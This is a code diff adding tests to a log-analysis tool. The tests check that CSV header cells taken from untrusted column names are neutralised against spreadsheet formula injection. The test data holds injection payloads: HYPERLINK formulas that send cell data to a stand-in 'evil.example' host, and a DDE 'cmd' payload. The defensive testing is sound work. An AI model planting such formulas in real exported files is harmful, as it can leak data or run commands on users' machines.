@@ -1334,3 +1334,91 @@ def test_skipped_database_is_reported_as_failed(tmp_path, bad_kind):
     assert performance['status'] == 'partial'
     assert next(record for record in performance['files'] if record['sources'] == [str(bad)])['status'] == 'failed'
     assert bad.read_bytes() == original
+
+
+class TestCsvHeaderIsSanitised:
+    """Column names reach the CSV header row, so they get the value guard too.
+
+    A ``-D`` database brings its own schema, so a column can be called
+    ``=HYPERLINK(...)``. Values are prefixed with ``'`` against formula
+    injection, and so is every header cell: a raw name would be a live formula
+    in the spreadsheet.
+    """
+
+    RULE: ClassVar[list[dict]] = TestCsvKeepsFieldsFromEveryFile.RULE
+    NAMES: ClassVar[tuple[str, ...]] = (
+        '=HYPERLINK("http://evil.example/?"&A2)',
+        '+HYPERLINK("http://evil.example/?"&A2)',
+        "-2+3+cmd|' /C calc'!A0",
+        "@SUM(1)",
+    )
+    FORMULA_PREFIXES: ClassVar[tuple[str, ...]] = ("=", "+", "-", "@", "\t", "\r")
+
+    def _header(self, tmp_path, *argv_tail):
+        ruleset = tmp_path / "rules.json"
+        ruleset.write_text(json.dumps(self.RULE), encoding="utf-8")
+        out = tmp_path / "out.csv"
+        argv = ["zircolite.py", "--ruleset", str(ruleset), "--csv", "-o", str(out),
+                "--quiet", *argv_tail]
+        with patch.object(sys, "argv", argv):
+            zircolite.cli.main()
+        rows = list(csv.reader(out.read_text(encoding="utf-8").splitlines(), delimiter=";"))
+        assert len(rows) >= 2
+        return rows[0]
+
+    def test_database_column_names_are_not_formulas(self, tmp_path):
+        db = tmp_path / "evil.db"
+        quoted = ['"' + name.replace('"', '""') + '"' for name in self.NAMES]
+        with closing(sqlite3.connect(db)) as conn:
+            conn.execute(f"CREATE TABLE logs (CommandLine TEXT, {', '.join(q + ' TEXT' for q in quoted)})")
+            conn.execute(
+                f"INSERT INTO logs (CommandLine, {', '.join(quoted)}) VALUES ({', '.join('?' * (len(quoted) + 1))})",
+                ["powershell -enc AAAA", *("x" for _ in quoted)],
+            )
+            conn.commit()
+
+        header = self._header(tmp_path, "--db-input", "-e", str(db))
+
+        assert [h for h in header if h.startswith(self.FORMULA_PREFIXES)] == []
+        for name in self.NAMES:
+            assert "'" + name in header
+
+    @pytest.mark.parametrize(
+        "mode_flags",
+        [pytest.param(("--no-parallel",), id="per-file"),
+         pytest.param((), id="parallel"),
+         pytest.param(("--unified-db",), id="unified")],
+    )
+    def test_split_derived_column_names_are_not_formulas(self, tmp_path, mode_flags):
+        logs = tmp_path / "logs"
+        logs.mkdir(parents=True)
+        hashes = ",".join(["MD5=abc", *(f"{name}=x" for name in self.NAMES)])
+        for name in ("a.json", "b.json"):
+            (logs / name).write_text(json.dumps({"Event": {
+                "System": {"EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational",
+                           "SystemTime": "2024-01-01T00:00:00Z"},
+                "EventData": {"CommandLine": "powershell -enc AAAA", "Hashes": hashes},
+            }}), encoding="utf-8")
+
+        header = self._header(tmp_path, "--evtx", str(logs), "-j", "--no-auto-mode", *mode_flags)
+
+        assert "MD5" in header
+        assert [h for h in header if h.startswith((*self.FORMULA_PREFIXES, "'"))] == []
+
+    def test_buffered_writer_sanitises_header_but_keeps_rows_aligned(self, dummy_ctx, tmp_path):
+        """The retained-results path: the cell under the renamed header keeps its value."""
+        dummy_ctx.no_output = False
+        dummy_ctx.csv_mode = True
+        dummy_ctx.outfile = str(tmp_path / "results.csv")
+        formula = '=HYPERLINK("http://evil.example")'
+
+        _write_csv_results(dummy_ctx, [
+            {"title": "Rule A", "rule_level": "high", "count": 1,
+             "matches": [{formula: "value", "User": "alice"}]},
+        ])
+
+        with open(dummy_ctx.outfile, encoding="utf-8", newline="") as fh:
+            header, row = list(csv.reader(fh, delimiter=dummy_ctx.delimiter))
+        assert formula not in header
+        assert row[header.index("'" + formula)] == "value"
+        assert row[header.index("User")] == "alice"
